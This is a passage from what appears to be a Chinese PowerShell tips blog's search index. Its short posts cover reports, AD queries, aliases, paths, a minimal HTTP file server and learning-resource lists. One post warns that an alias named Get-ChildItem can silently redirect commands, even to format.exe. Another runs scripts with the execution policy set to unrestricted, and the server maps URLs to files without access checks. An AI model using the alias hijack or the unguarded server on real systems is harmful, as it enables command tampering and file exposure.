ValueFromPipeline 属性。下一步，在函数中添加一段 Process 脚本块。这段代码充当循环的作用，和 ForEach-Object 十分相似，并且作用于管道送过来的每一个对象上。","link":"/2014/07/11/accepting-multiple-input/"},{"title":"如何简洁地汇报 bug","text":"英文： Given input X I would expect output Y, but your app gives me Z instead. 中文： 我输入了 X，期望输出结果是 Y，而您的程序输出了 Z。","link":"/2014/07/11/report-bug-compactly/"},{"title":"PowerShell 技能连载 - 创建优越的报告","text":"当您克隆对象时，您可以修改它们的所有属性。克隆对象时可以导致原始对象“分离”，这是一个不错的主意。当您克隆了对象，您可以对该对象做任意的操作，例如修改或调整它的属性。 只需要用 Select-Object 命令就可以克隆对象。 这个例子列出文件夹中的内容，然后通过 Select-Object 处理，然后将其中的一些数据格式修饰一下。 Get-ChildItem -Path c:\\windows | # clone the objects and keep the properties you want/add new properties (like &quot;age...&quot;) Select-Object -Property LastWriteTime, 'Age(days)', Length, Name, PSIsContainer | # change the properties of the cloned object as you like ForEach-Object { # calculate the file/folder age in days $_.'Age(days)' = (New-Timespan -Start $_.LastWriteTime).Days # if it is a file, change size in bytes to size in MB if ($_.PSisContainer -eq $false) { $_.Length = ('{0:N1} MB' -f ($_.Length / 1MB)) } # do not forget to return the adjusted object so the next one gets it $_ } | # finally, select the properties you want in your report: Select-Object -Property LastWriteTime, 'Age(days)', Length, Name | # sort them as you like: Sort-Object -Property LastWriteTime -Descending | Out-GridView 该例子的结果以 MB 而不是字节为单位显示文件的大小，并且添加了一个称为“Age(days)”的列表示文件和文件夹创建以来的天数。","link":"/2014/07/14/creating-great-reports/"},{"title":"PowerShell 技能连载 - 从独立的文件中加载函数","text":"适用于 PowerShell 3.0 及以上版本 为了让事情简化一些，您可能希望将 PowerShell 函数存放在一个独立的文件中。要将这些函数加载到您的业务脚本中，您可以使用这个简单的方法： 请确保包含 PowerShell 函数的脚本文件和业务脚本存放在同一个文件夹下。然后，在您的业务脚本中使用这行简单的代码： . &quot;$PSScriptRoot\\library1.ps1&quot; 这行代码将会从当前脚本存放的文件夹中加载一个称为“library1.ps1”的脚本。不要漏了前面的 . 和空格：“点加文件名”的方式执行一个文件，能够确保该文件中的所有变量和函数都在调用者的上下文中定义，并且当脚本执行完以后不会被清除掉。 请注意 $PSScriptRoot 总是指向脚本所在文件夹的路径（从 PowerShell 3.0 开始）。请确保已经保存了您的脚本，因为只有保存过的脚本才有父文件夹。","link":"/2014/07/15/loading-functions-from-separate-file/"},{"title":"PowerShell 技能连载 - 快速查找 AD 账户","text":"适用于所有 PowerShell 版本 您不必使用额外的 cmdlet 就能在您的活动目录中搜索用户账户或计算机。假设您已登录了一个域，只需要使用这段代码： $ldap = '(&amp;(objectClass=computer)(samAccountName=dc*))' $searcher = [adsisearcher]$ldap $searcher.FindAll() 这段代码将查找所有以“dc”开头的计算机账户。$ldap 可以是任何合法的 LDAP 查询语句。要查找用户，请将“computer”替换为“user”。","link":"/2014/07/16/finding-ad-accounts-easily/"},{"title":"PowerShell 模块开发流程","text":"我们希望使用 ISE 编辑器开发 PowerShell 的 .psm1 模块时，能够享受和开发 .ps1 脚本一样的体验： 能够在 ISE 中按 F5 键运行并观察执行效果。 能够在 ISE 中设置断点并进行调试。 编辑脚本并保存后，能够使修改处即时生效。 如果直接用 ISE 打开 .psm1 模块文件，是无法直接运行的。我和史瑞克朋友探讨了这个问题，现将他的经验整理如下： 先直接以 .ps1 的方式开发和调试（将模块代码和测试代码写在同一个 .ps1 文件中）。 注意在这种方式下，Export-Member 是不能用的，可以暂时注释掉。 基本开发、调试完以后，将 .ps1 后缀改为 .psm1，并取消 Export-Member 的注释。 同时打开 .psm1 和 .ps1（前者是可复用的模块，后者是最终的应用脚本），即可在 .psm1 中设置断点进行调试。 请注意，如果将模块文件放在 %PSModulePath% 目录下，宿主只会在启动时自动加载一次模块的内容。如果在宿主启动之后编辑了 .psm1 文件，那么已经启动的宿主是不会感知到的，仍然执行的是旧的模块文件代码。 如果要让 .psm1 中的更改即时生效，需要在 .ps1 脚本的头部加上这段代码，显式加载模块： if (gmo Test-Module) { rmo Test-Module } ipmo Test-Module Test-Module # 实际的业务 这样，每次重新运行 .ps1 脚本时，都会重新加载新的 .psm1 文件。待调试完之后，可以把头两行注释掉。","link":"/2014/07/16/powershell-module-develop-workflow/"},{"title":"PowerShell 技能连载 - 删除别名","text":"适用于所有 PowerShell 版本 虽然您可以轻松地用 New-Alias 和 Set-Alias 来创建新的别名，但是没有一个 cmdlet 可以删除别名。 PS&gt; Set-Alias -Name devicemanager -Value devmgmt.msc PS&gt; devicemanager PS&gt; 要删除一个别名，您通常需要重启动您的 PowerShell。或者您可以通过 Alias: 虚拟驱动器删除它们： PS&gt; del Alias:\\devicemanager PS&gt;","link":"/2014/07/17/delete-aliases/"},{"title":"PowerShell 技能连载 - 测试不带别名的脚本","text":"适用于所有 PowerShell 版本 别名在交互式 PowerShell 控制台中用起来很酷，但是不应在脚本中使用它们。在脚本中，请使用基础的命令（所以请使用 Get-ChidItem 而不是 dir 或 ls）。 要测试一个脚本，您可以删除所有的别名然后试试脚本是否任然能运行。以下是如何删除特定 PowerShell 会话中的所有别名的方法（它不会影响其它 PowerShell 会话，并且不会永久地删除内置的别名）： PS&gt; Get-Alias | ForEach-Object { Remove-Item -Path (&quot;Alias:\\&quot; + $_.Name) -Force } PS&gt; dir dir : The term 'dir' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again. At line:1 char:1 + dir + ~~~ + CategoryInfo : ObjectNotFound: (dir:String) [], CommandNotFoundException + FullyQualifiedErrorId : CommandNotFoundException PS&gt; Get-Alias 如您所见，所有别名都清空了。现在如果一个脚本使用了别名，它将会抛出一个异常。而关闭并重启 PowerShell 之后，所有内置的别名都恢复了。","link":"/2014/07/18/test-driving-scripts-without-aliases/"},{"title":"PowerShell 技能连载 - 转换特殊字符（第一部分）","text":"适用于所有 PowerShell 版本 有些时候我们需要将特殊字符转换为其它字符。以下是一个实现该功能的小函数： function ConvertTo-PrettyText($Text) { $Text.Replace('ü','ue').Replace('ö','oe').Replace('ä', 'ae' ).Replace('Ü','Ue').Replace('Ö','Oe').Replace('Ä', 'Ae').Replace('ß', 'ss') } 只要根据需要添加 Replace() 调用来处理文本即可。请注意 Replace() 是大小写敏感的，这样比较好：您可以针对大小写来做替换。 PS&gt; ConvertTo-PrettyText -Text 'Mr. Össterßlim' Mr. Oesstersslim","link":"/2014/07/21/converting-special-characters-part-1/"},{"title":"用 PowerShell 输出中文到剪贴板","text":"方法一 通过 clip.exe用 PowerShell 将字符串输出到剪贴板的最简单方式是： 'abc' | clip.exe 不过直接这么使用的话，如果待输出的字符串是包含中文的，那么剪贴板里的内容会出现“乱码”： 'abc中文def' | clip.exe 剪贴板里的内容变成： abc??def 这是因为为了兼容旧程序，管道操作缺省将字符串采用 ASCII 编码，因此对于中文字符，被转换成了“??”。解决方案如下： $OutputEncoding = [Console]::OutputEncoding 'abc中文def' | clip.exe 方法二 通过 WPF 方法以 -sta 参数启动 PowerShell 后，执行以下代码： Add-Type -Assembly PresentationCore [Windows.Clipboard]::SetText('abc中文def') PowerShell 2.0 的控制台，缺省设置是 MTAPowerShell 3.0 的控制台，缺省设置是 STA。 关于 -sta 的知识，请参见PowerShell中的 STA和MTA。 参考材料： $OutputEncoding to the rescue Powershell能否将文件列表写入剪切板 PowerShell中的 STA和MTA PowerShell.exe Command-Line Help QQ 群 *PowerShell技术交流（271143343） 2014-07-01 的讨论","link":"/2014/07/21/forward-chinese-text-into-clipboard/"},{"title":"PowerShell 技能连载 - 转换特殊字符（第二部分）","text":"适用于所有 PowerShell 版本 在前一个技巧中我们演示了如何替换一段文本中的特殊字符。以下是另一种方法，虽然慢一点，但是更容易维护。它也演示了一个大小写敏感的哈希表： function ConvertTo-PrettyText($Text) { $hash = New-Object -TypeName HashTable $hash.'ä' = 'ae' $hash.'ö' = 'oe' $hash.'ü' = 'ue' $hash.'ß' = 'ss' $hash.'Ä' = 'Ae' $hash.'Ö' = 'Oe' $Hash.'Ü' = 'Ue' Foreach ($key in $hash.Keys) { $Text = $text.Replace($key, $hash.$key) } $Text } 请注意该函数并不是以 @{} 的方式定义一个哈希表，而是构造了一个 HashTable 对象。由于 PowerShell 所带的哈希表是大小写不敏感的，而这个函数创建的哈希表是大小写敏感的。这一点非常重要，因为该函数期望对大小写字母作区分。 PS&gt; ConvertTo-PrettyText -Text 'Mr. Össterßlim' Mr. Oesstersslim PS&gt; 如果您想要指定 ASCII 码，以下是一个用 ASCII 码作为键的变体： function ConvertTo-PrettyText($Text) { $hash = @{ 228 = 'ae' 246 = 'oe' 252 = 'ue' 223 = 'ss' 196 = 'Ae' 214 = 'Oe' 220 = 'Ue' } foreach($key in $hash.Keys) { $Text = $text.Replace([String][Char]$key, $hash.$key) } $Text }","link":"/2014/07/22/converting-special-characters-part-2/"},{"title":"PowerShell 技能连载 - 别名有可能带来风险","text":"适用于所有 PowerShell 版本 在 PowerShell 中执行命令时，别名享有最高的优先权，所以如果遇到了有歧义的命令，PowerShell 将会优先执行别名命令。 这样可能很危险：如果您允许别人更改您的 PowerShell 环境，并且私下添加了您不知道的别名，那么您的脚本执行起来的效果可能完全不同。 Here is a simple call that adds the alias Get-ChildItem and lets it point to ping.exe:以下是一个简单的例子，创建了一个名为 Get-ChildItem 的别名，并指向 ping.exe： Set-Alias -Name Get-ChildItem -Value ping 这将导致一切都改变了：Get-ChildItem 不再列出文件夹内容了，而是变为 ping 的行为。甚至，所有的别名（例如 dir 和 ls）现在都指向 ping。我们假想一下如果别名指向了 format.exe，那么您的脚本会做什么？","link":"/2014/07/23/aliases-can-be-dangerous/"},{"title":"PowerShell 技能连载 - 以底层的方式管理打印机","text":"适用于所有 PowerShell 版本 新版本的 Windows 操作系统，例如 Windows 8 和 Windows Server 2012 对打印机支持得很好，不过如果您在运行旧版的 Windows，那么这段代码可能有所帮助： PS&gt; rundll32.exe PRINTUI.DLL,PrintUIEntry PS&gt; 请注意这段代码是大小写敏感的！请不要加空格，也不要改变大小写。 这段代码将打开一个帮助窗口，列出了许多东西，包括演示如何安装、删除和复制打印机驱动的例子。这个工具也可以远程使用，假设您通过合适的组策略允许远程操作。","link":"/2014/07/24/managing-printers-low-level/"},{"title":"PowerShell 技能连载 - 指定递归深度","text":"适用于 PowerShell 3.0 及更高版本 当使用 Get-ChildItem 来列出文件夹内容时，可以用 -Recurse 参数来对子目录进行递归。然而，这导致无法控制递归深度。Get-ChildItem 会在所有子目录中搜索，无限地递归下去。 Get-ChildItem -Path $env:windir -Filter *.log -Recurse -ErrorAction SilentlyContinue 有些时候，我们会见到一种类似这样的方法，来试图控制递归的深度： Get-ChildItem -Path $env:windir\\*\\*\\* -Filter *.log -ErrorAction SilentlyContinue 然而，这并不能限制只递归 3 层。实际上，它的作用是搜索 3 层及 3 层以上的文件夹。它不会搜索 1 层或 2 层的文件夹。 限制递归深度的唯一办法是自己实现递归算法： function Get-MyChildItem { param ( [Parameter(Mandatory = $true)] $Path, $Filter = '*', [System.Int32] $MaxDepth = 3, [System.Int32] $Depth = 0 ) $Depth++ Get-ChildItem -Path $Path -Filter $Filter -File if ($Depth -le $MaxDepth) { Get-ChildItem -Path $Path -Directory | ForEach-Object { Get-MyChildItem -Path $_.FullName -Filter $Filter -Depth $Depth -MaxDepth $MaxDepth} } } Get-MyChildItem -Path c:\\windows -Filter *.log -MaxDepth 2 -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName 这段代码将获取您 Windows 文件夹中深度在 2 层以内的 *.log 文件。","link":"/2014/07/25/recursing-a-given-depth/"},{"title":"PowerShell 技能连载 - 使系统休眠","text":"适用于 PowerShell 所有版本 以下是一个简单的系统调用，可以使系统休眠（当然，前提是启用了休眠功能）： function Start-Hibernation { rundll32.exe PowrProf.dll, SetSuspendState 0,1,0 } 请注意这个函数调用是大小写敏感的！","link":"/2014/07/28/hibernate-system/"},{"title":"PowerShell 技能连载 - 修正名单中的大小写","text":"适用于所有 PowerShell 版本 假设您的工作是更新一份名单。以下方法可以确保只有名字的第一个字母改成大写。这个方法对于姓-名的方式也是有效的： $names = 'some-wILD-casING','frank-PETER','fred' Foreach ($name in $names) { $corrected = foreach ($part in $name.Split('-')) { $firstChar = $part.Substring(0,1).ToUpper() $remaining = $part.Substring(1).ToLower() &quot;$firstChar$remaining&quot; } $corrected -join '-' } Some-Wild-Casing Frank-Peter Fred","link":"/2014/07/29/case-correct-name-lists/"},{"title":"PowerShell 技能连载 - 修正 PowerShell 中的路径","text":"适用于所有 PowerShell 版本 有些时候，您会为某些奇怪的路径格式感到困惑，比如这个： Microsoft.PowerShell.Core\\FileSystem::C:\\windows\\explorer.exe 这是一个完整的 PowerShell 路径名，路径中包含了了模块名和提供器名。要得到一个纯的路径名，请使用以下代码： Convert-Path -Path Microsoft.PowerShell.Core\\FileSystem::C:\\windows\\explorer.exe","link":"/2014/07/30/correcting-powershell-paths/"},{"title":"PowerShell 技能连载 - 查找并提取注册表键的路径","text":"适用于所有 PowerShell 版本 在前一个技巧中，我们演示了如何将一个 PowerShell 内部的路径格式转换为一个真实的路径。以下是一个用力。这段代码递归地搜索 HKEY_CURRENT_USER 键，并且找出所有包含单词“_powershell_”的注册表键（您可以将搜索关键字换成任何别的）： Get-ChildItem -Path HKCU:\\ -Include *PowerShell* -Recurse -ErrorAction SilentlyContinue | Select-Object -Property *Path* | Out-GridView 这段代码输出所有名称中包含“Path_”的属性。如您所见，注册表键中有两个属性包含该关键字：_PSPath 和 _PSParentPath_。两者都是 PowerShell 内置的路径格式。 要提取所有满足搜索条件的注册表键的路径，请使用以下代码： Get-ChildItem -Path HKCU:\\ -Include *PowerShell* -Recurse -ErrorAction SilentlyContinue | ForEach-Object { Convert-Path -Path $_.PSPath }","link":"/2014/07/31/finding-and-dumping-registry-key-paths/"},{"title":"PowerShell 技能连载 - 查找 AD 用户","text":"适用于所有 PowerShell 版本 假如您已登录到了一个活动目录域中，那么只需要执行一些简单的命令就可以搜索活动目录。在前一个技巧中我们演示了最基本的脚本。以下是一个扩展，它能够定义一个搜索的根（搜索的起点），就像一个扁平的搜索一样（相对于在容器中递归而言）。 它也演示了如何将活动目录的搜索结果转换成实际的用户对象： $SAMAccountName = 'tobias' $SearchRoot = 'LDAP://OU=customer,DC=company,DC=com' $SearchScope = 'OneLevel' $ldap = &quot;(&amp;(objectClass=user)(samAccountName=*$SAMAccountName*))&quot; $searcher = [adsisearcher]$ldap $searcher.SearchRoot = $SearchRoot $searcher.PageSize = 999 $searcher.SearchScope = $SearchScope $searcher.FindAll() | ForEach-Object { $_.GetDirectoryEntry() } | Select-Object -Property *","link":"/2014/08/01/finding-ad-users/"},{"title":"用 PowerShell 批量分割 QQ 聊天记录","text":"纯文本文件有诸多的好处： 通用 易于管理 易于搜索 易于迁移 接下来我们用 PoewrShell 来处理 QQ 的聊天记录。目的是将所有的聊天记录按照“组名/对象名.txt”来分别保存每个好友、每个 QQ 群等的聊天记录。 我现在用的是 QQ 6.1 (11905) 版本。依次打开 QQ / 工具 / 消息管理器，点击右上角的倒三角按钮可以看到“导出全部消息记录”菜单项。我们在接下来的对话框里的保存类型中选择“文本文件(*.txt,不支持导入)”，并用默认的“全部消息记录.txt”文件名保存。保存之后的文件内容大概是如下格式： 消息记录（此消息记录为文本格式，不支持重新导入） ================================================================ 消息分组:我的好友 ================================================================ 消息对象:Victor.Woo ================================================================ 2010-01-06 16:57:28 Victor.Woo http://pic4.nipic.com/20090728/1684061_175750076_2.jpg 2010-05-27 12:29:35 Victor.Woo 6块钱包月55 8000/月 中心端，用户端 ================================================================ 消息分组:技术.关注 ================================================================ 消息对象:*PowerShell技术交流 ================================================================ 2013-06-23 15:52:32 此消彼长，云过有痕&lt;qq_g@163.com&gt; http://yun.baidu.com/buy/center?tag=4#FAQ02 百度亮了，自己找亮点 2013-06-23 18:42:35 Victor.Woo&lt;victorwoo@gmail.com&gt; [表情] 观察它的规律： 以 ================================================================ 作为每一段的元数据开始。 接下来依次是消息分组、分隔符、消息对象。 以 ================================================================ 作为元数据的结束。 元数据之后，是正文部分，直到下一个元数据开始。 文件头部还有两行无关内容。 文件尺寸巨大，不适合整体用正则表达式来提取，只能一行一行解析。 我们的目标是生成 我的好友/Victor.Woo.txt 和 技术.关注/.PowerShell技术交流.txt 根据这个规律，我们可以用类似“状态机”的思想来设计 PowerShell 脚本。在遍历源文件的所有行时，用一个 $status 变量来表示当前的状态，各个状态的含义如下： 状态 含义 INIT 初始状态 ENTER_BLOCK 进入一个元数据块 ENTER_GROUP “消息分组”解析完成 ENTER_SPLITTER 元数据中间的分隔符解析完成 ENTER_TARGET “消息对象”解析完成 LEAVE_BLOCK 元数据块解析完成 CONTENT 当前行是正文内容 然后用一个 switch 语句让 $status 变量在这些状态之间来回跳转，就能解析出一个一个独立的消息文件了。完整代码如下： function Get-Status($status, $textLine, $lineNumber, $block) { $splitter = '================================================================' switch ($status) { 'INIT' { if ($textLine -eq $splitter) { $status = 'ENTER_BLOCK' } } 'ENTER_BLOCK' { if ($textLine -cmatch '消息分组:(.*)') { $block.Group = $matches[1] $block.Target = $null $status = 'ENTER_GROUP' break } else { Write-Error &quot;[$lineNumber] [$status] $textLine&quot; exit } } 'ENTER_GROUP' { if ($textLine -eq $splitter) { $status = 'ENTER_SPLITTER' break } else { Write-Error &quot;[$lineNumber] [$status] $textLine&quot; exit } } 'ENTER_SPLITTER' { if ($textLine -cmatch '消息对象:(.*)') { $block.Target = $matches[1] $status = 'ENTER_TARGET' break } else { Write-Error &quot;[$lineNumber] [$status] $textLine&quot; exit } } 'ENTER_TARGET' { if ($textLine -eq $splitter) { $status = 'LEAVE_BLOCK' break } else { Write-Error &quot;[$lineNumber] [$status] $textLine&quot; exit } } 'LEAVE_BLOCK' { if ($textLine -eq $splitter) { $status = 'ENTER_BLOCK' break } else { $status = 'CONTENT' } } 'CONTENT' { if ($textLine -eq $splitter) { $status = 'ENTER_BLOCK' break } else { $status = 'CONTENT' } } } return $status } $status = 'INIT' $lineNumber = 0 $block = @{} $targetPath = $null cat 全部消息记录.txt -Encoding UTF8 | foreach { $textLine = $_ $lineNumber++ $status = Get-Status $status $textLine $lineNumber $block switch ($status) { 'LEAVE_BLOCK' { if ($block.Target -eq '最近联系人') { break } $dirName = $block.Group.Replace('*', '.') if (!(Test-Path $dirName)) { md $dirName | Out-Null } $fileName = $block.Target.Replace('*', '.') $targetPath = (Join-Path $dirName $fileName) + '.txt' if (Test-Path $targetPath) { del $targetPath } echo $targetPath } 'CONTENT' { #echo $textLine if ($block.Target -eq '最近联系人') { break } Out-File -InputObject $textLine -Encoding utf8 -LiteralPath $targetPath -Append } } } 您也可以在这里下载完成后的版本。","link":"/2014/08/01/split-qq-msg-with-powershell/"},{"title":"AngularJS 学习路线","text":"AngularJS 是Google开源的一款JavaScript MVC框架，弥补了HTML在构建应用方面的不足，诞生以来吸引了大量的目光，也迅速成为了Web开发领域的新宠。 网站 AngularJS — Superheroic JavaScript MVW Framework - 官方网站 angular/angular.js - github 使用超动感HTML &amp; JS开发WEB应用! - 中文社区 首页 - AngularJS Nice Things - AngularJS学习和经验分享平台。 Angular Tips - 博客型英文网站 博客 破狼 - 博客园 入门官方使用指南 AngularJS: Tutorial: Tutorial AngularJS中文网 图灵社区: 合集 : AngularJS入门教程 - AngularJS.org官方使用指南的翻译 AngularJS 入门教程 - 也是AngularJS.org官方使用指南的翻译 w3school AngularJS 教程 链接合集请展开看以下链接内容* 2013年度最强AngularJS资源合集-CSDN.NET - 本文整理了2013年度一些非常有价值的AngularJS相关教程和资源。 AngularJS-Learning/ZH-CN.md at master · jmcunningham/AngularJS-Learning - 这是一个AngularJS Guide的中文分支版本，提供关于AngularJS的视频、入门、使用与论坛等中文互联网内容，这里的分类并没有完全参照英文版，也并不固定，如果你有发现新的内容需要添加新类别，直接加吧。 DEMO 项目 AngularJS • TodoMVC AngularJS 实例 - w3school Angular范例程序 - 中文组件库 参考手册 AngularJS 参考手册 - w3school 视频教程 课程学习-分享：使用AngularJS开发下一代Web应用 - _大漠穷秋_的现场视频，总共不到一个小时。 课程学习-系列：AngularJS实战 - _大漠穷秋_的课程，推荐。 课程学习-分享：阿里懒懒交流会AngularJS专场 - 经验专题现场交流。 纸质书籍 用AngularJS开发下一代Web应用 - 中文的目前只有这一本。仍然是_大漠穷秋_翻译的。 图表 一张图告诉你Angular的内核结构 指令收藏（Directives） jirikavi/AngularJS-Toaster - AngularJS Toaster is a customized version of “toastr” non-blocking notification javascript library.","link":"/2014/08/02/angularjs-guideline/"},{"title":"mongodb 学习路线","text":"MongoDB 是一个基于分布式文件存储的数据库。由C++语言编写。旨在为WEB应用提供可扩展的高性能数据存储解决方案。 入门文章 什么是MongoDB - WEB开发者 - 解答什么是 mongodb。 电子书籍 the-little-mongodb-book/mongodb.markdown at master · geminiyellow/the-little-mongodb-book - 中文版《The Little MongoDB Book》 工具 Robomongo — shell-centric MongoDB management tool (MongoDB Admin UI) - 免费，跨平台，免安装，体验好。 MongoVUE - 收费，Windows，体验略次。 纸质书籍 MongoDB权威指南","link":"/2014/08/02/mongodb-guideline/"},{"title":"mongoose 学习路线","text":"mongoose 是 mongodb 的一个对象模型工具，可以工作于异步环境下。 入门文章 Mongoose学习参考文档——基础篇 - CNode Express + Mongoose 极简入门 nodejs学习7：express+mongoose - 前端博客 &lt;贴板&gt; Mongoose - 让NodeJS更容易操作Mongodb数据库 - CSSer","link":"/2014/08/02/mongoose-guideline/"},{"title":"用 PowerShell 创建一个 HTTP 服务器","text":"用 PowerShell 创建一个 HTTP 服务器其实非常简单，只要 0.8 KB 的代码就搞定了。只要将以下代码保存成 httpd.ps1 并在您的 www 资源目录里执行即可： param($Root=&quot;.&quot;, $Port=8080, $HostName=&quot;localhost&quot;) pushd $Root $Root = pwd $listener = New-Object System.Net.HttpListener $listener.Prefixes.Add(&quot;http://$HostName`:$Port/&quot;) $listener.Start() echo (&quot;Start {0} at `&quot;$Root`&quot;&quot; -f ($listener.Prefixes | select -f 1)) echo &quot;Enter Ctrl + C to stop.&quot; while ($true) { $context = $listener.GetContext() $url = $context.Request.Url.LocalPath.TrimStart('/') $res = $context.Response $path = Join-Path $Root ($url -replace &quot;/&quot;,&quot;\\&quot;) echo $path if ((Test-Path $path -PathType Leaf) -eq $true) { $content = [IO.File]::ReadAllBytes($path) $res.OutputStream.Write($content, 0, $content.Length) } else { $res.StatusCode = 404 } $res.Close() } 您也可以从这儿下载完整的文件。 这是从一个开源项目中看到的：MarkdownPresenter/httpd.ps1 at master · jsakamoto/MarkdownPresenter","link":"/2014/08/03/create-http-server-using-powershell/"},{"title":"markdown 学习路线","text":"Markdown 是一种轻量级标记语言，创始人为约翰·格鲁伯（John Gruber）。它允许人们“使用易读易写的纯文本格式编写文档，然后转换成有效的XHTML(或者HTML)文档”。这种语言吸收了很多在电子邮件中已有的纯文本标记的特性。 介绍 Markdown - 维基百科，自由的百科全书 规范Markdown 的基本语法较为简单，所以多家衍生出不同的扩展版本。其中由于 GitHub 网站的流行，导致 Markdown 的 GitHub 扩展版本（简称 GFM）较为流行。 以下是基本语法和各个扩展版本的语法文档原始链接： Markdown 快速入门(简体中文版) Markdown 语法说明(简体中文版) Daring Fireball: Markdown Syntax Documentation Michel Fortin – PHP Markdown Extra Markdown Editing Help - Stack Overflow GitHub Flavored Markdown · GitHub Help - 简称 GFM，是目前较为通用的标准。 编辑器 MarkdownPad - The Markdown Editor for Windows 基于 .NET 开发，只用于 Windows，功能较齐全。GFM 风格离线编辑要收费。 Sublime Text + Markdown Editing 插件，是我目前在用的，支持在浏览器中预览等功能。参见 sublime装配markdown插件 - 开源软件 Cmd Markdown 编辑阅读器 - 作业部落出品 - 在线编辑器 文化 拷贝为Markdown - 将你在页面中选中的HTML格式转化为Markdown格式 dcurtis/markdown-mark - markdown 图标 jeffa00/posh-markdown - PowerShell Cmdlet to convert Markdown to HTML. Uses MarkdownSharp DLL 用 Markdown 来生成 HTML 幻灯片 jdan/cleaver - 简易，可换皮肤。 gnab/remark - 略麻烦一点。 jsakamoto/MarkdownPresenter - 不好用。 用 Markdown 来写书 GitBook","link":"/2014/08/03/markdown-guideline/"},{"title":"从命令行运行 PowerShell","text":"从命令行运行 PowerShell 命令最精炼的代码： @powershell -nop -ex unrestricted -c &quot;Get-ChildItem&quot; 最后一个参数可以换成别的命令。另外，从命令行运行 .ps1 脚本的方式是： @powershell -nop -ex unrestricted .\\something.ps1","link":"/2014/08/03/run-powershell-from-cmd/"},{"title":"Hexo 博客学习路线","text":"Hexo 是一个快速、便捷、强大的博客框架，通过 Node.js 技术构建。 如果你对默认配置满意，只需几个命令便可秒搭一个hexo。 如果你跟我一样喜欢折腾下，30分钟也足够个性化。 如果你过于喜欢折腾，可以折腾个把星期，尽情的玩。 官方链接 Hexo - 官方网站 hexojs/hexo - github 教程 hexo你的博客 - 推酷 - 系统，精炼，推荐。 Zippera’s blog 的 hexo 分类 hexo系列教程：（一）hexo介绍 hexo系列教程：（二）搭建hexo博客 hexo系列教程：（三）hexo博客的配置、使用 hexo系列教程：（四）hexo博客的优化技巧 hexo系列教程：（五）hexo博客的优化技巧续 hexo 主题优化 怎样在博文中嵌入图片、音乐、视频？ 把flickr相册嵌入网页 云空间 将hexo博客部署到bae - 不能以 github API 的方式部署。 托管博客到STDYUN 托管博客到gitcafe - 推荐使用，和 github 的 API 一致。 工具我制作了一系列脚本，用于整理博客文章、抓取外部图片、批处理生成发布等，请参见 victorwoo/victorwoo - GitCafe。","link":"/2014/08/04/hexo-guideline/"},{"title":"打包 node 应用程序为单一文件可执行程序","text":"解决方案 crcn/nexe - create a single executable out of your node.js apps。支持多个平台，似乎靠谱。 areve/node2exe - 只支持 Windows，用 copy /b 合并多个文件。 appjs/appjs - 已过期，被 node-webkit 替代。 rogerwang/node-webkit - Call all Node.js modules directly from DOM and enable a new way of writing applications with all Web technologies. 带图形界面的不二选择。 creationix/topcube - Gives node developers a way to have a desktop GUI to their node servers using HTML5 + CSS3 as the GUI platform. 讨论 javascript - Packaging a node.js webapp as a normal desktop app - Stack Overflow javascript - Make exe files from node.js app - Stack Overflow","link":"/2014/08/04/packeting-node-app/"},{"title":"PowerShell 技能连载 - 请注意 UNC 路径！","text":"适用于所有 PowerShell 版本 许多 cmdlet 可以处理 UNC 路径，但是使用 UNC 路径会导致很多古怪的情况。请看以下： PS&gt; Test-Path -Path \\\\127.0.0.1\\c$ True 这段代码返回了 true，该 UNC 路径存在。现在将当前驱动器变为一个非文件系统驱动器，然后再次实验： PS&gt; cd hkcu:\\ PS&gt; Test-Path -Path \\\\127.0.0.1\\c$ False 同样的路径现在返回了 false。这是因为 UNC 路径并不包含驱动器号，而 PowerShell 需要驱动器号来指定正确的提供器。如果一个路径不包含驱动器号，那么 PowerShell 假设使用当前驱动器的提供器。所以如果您将当前的目录改为注册表，PowerShell 尝试在那儿查找 UNC 路径，那么就会失败。 更糟糕的是，出于某些未知的原因，但您用 net use 来映射驱动器时，PowerShell 在使用 cmdlet 来访问驱动器时可能会也可能不会产生混淆。 解决方案十分简单：当您用 cmdlet 访问 UNC 时，始终在 UNC 路径前面加上正确的提供器名称。这将消除该问题： PS&gt; Test-Path -Path FileSystem::\\\\127.0.0.1\\c$ True PS&gt; cd hkcu:\\ PS&gt; Test-Path -Path \\\\127.0.0.1\\c$ False PS&gt; Test-Path -Path FileSystem::\\\\127.0.0.1\\c$ True 如果您遇到了 net use 产生的问题，也可以使用同样的办法，在路径前面加上 “FileSystem::。该问题可以立刻得到解决。","link":"/2014/08/04/watch-out-with-unc-paths/"},{"title":"Excel 列号和数字互相转换","text":"Excel 的列号是采用“A”、“B”……“Z”、“AA”、“AB”……的方式编号。但是我们在自动化操作中，往往希望用数字作为列号。我们可以用 PowerShell 来实现 Excel 的列号和数字之间的互相转换。 需求归纳Excel 列号 -&gt; 数字 A 1 AB 28 AC 29 数字 -&gt; Excel 列号 1 A 2 B 24 Y 26 Z 27 AA 28 AB 算法分析 Excel 列号 -&gt; 数字 用 ASCII 编码对输入的字符串解码，得到一个数字型数组。 用 26 进制对数组进行处理（逐位 *= 26，然后累加）。 数字 -&gt; Excel 列号 用 26 进制对数字进行处理（不断地 /= 26，取余数），得到数字型数组。 将数字型数组顺序颠倒。 用 ASCII 编码对数字型数组编码，得到 Excel 风格的列号。 源代码转换函数： function ConvertFrom-ExcelColumn ($column) { $result = 0 $ids = [System.Text.Encoding]::ASCII.GetBytes($column) | foreach { $result = $result * 26 + $_ - 64 } return $result } function ConvertTo-ExcelColumn ($number) { $ids = while ($number -gt 0) { ($number - 1) % 26 + 1 + 64 $number = [math]::Truncate(($number - 1) / 26) } [array]::Reverse($ids) return [System.Text.Encoding]::ASCII.GetString([array]$ids) } 测试代码： echo &quot;A`t$(ConvertFrom-ExcelColumn A)&quot; echo &quot;AB`t$(ConvertFrom-ExcelColumn AB)&quot; echo &quot;AC`t$(ConvertFrom-ExcelColumn AC)&quot; echo '' @(1..2) + @(25..28) | foreach { echo &quot;$_`t$(ConvertTo-ExcelColumn $_)&quot; } 执行结果： A 1 AB 28 AC 29 1 A 2 B 25 Y 26 Z 27 AA 28 AB 您也可以在这里下载完整的脚本。","link":"/2014/08/05/conversion-between-number-and-excel-column/"},{"title":"PowerShell 技能连载 - 编辑“hosts”文件","text":"适用于所有 PowerShell 版本 如果您常常需要修改“hosts”文件，那么手工用提升权限的记事本实例来打开文件是相当乏味的事情。这是因为该文件只能被 Administrators 用户修改，所以普通的记事本实例无法修改它。 以下是一段您可以直接使用，或者调整一下用来打开任何需要提升权限的程序的脚本。 function Show-HostsFile { 